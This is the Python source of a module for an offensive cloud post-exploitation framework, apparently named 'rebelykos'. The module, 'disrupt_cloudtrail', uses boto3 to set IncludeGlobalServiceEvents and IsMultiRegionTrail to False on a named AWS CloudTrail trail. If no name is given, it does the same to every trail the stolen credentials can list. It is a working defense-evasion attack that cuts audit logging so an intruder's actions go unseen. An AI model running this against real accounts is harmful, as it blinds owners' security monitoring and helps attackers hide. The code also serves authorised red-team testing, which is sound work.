import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "disrupt_cloudtrail"
        self.description = ("Make IncludeGlobalServiceEvents"
                            " and IsMultiRegionTrail False.")
        self.author = "Takahiro Yokoyama"
        self.options["Name"] = {
            "Description": ("Name of the trail to disrupt. if not specified"
                            ", try to disrupt all trails user could list."),
            "Required": False,
            "Value": ""
        }

    def run(self):

        def _disrupt(name):
            return self._handle_err(client.update_trail,
                                    Name=name,
                                    IncludeGlobalServiceEvents=False,
                                    IsMultiRegionTrail=False)

        client = boto3.client("cloudtrail", **self["profile"])
        trail_name = self["Name"]
        if trail_name:
            func_info, result = _disrupt(trail_name)
            yield func_info
            yield result
        else:
            func_info, result = self._handle_err(client.describe_trails)
            yield func_info
            if result[0] == res.RESULT:
                yield result[0], result[1]["trailList"]
                trails = result[1]["trailList"]
                for trail in trails:
                    func_info, result = _disrupt(trail["Name"])
                    yield func_info
                    yield result
            else:
                yield (res.INFO,
                       ("Lack of right to list trails "
                        "but might be able to disrupt trail"
                        " if you specify trail name."))
        yield res.END, "End"
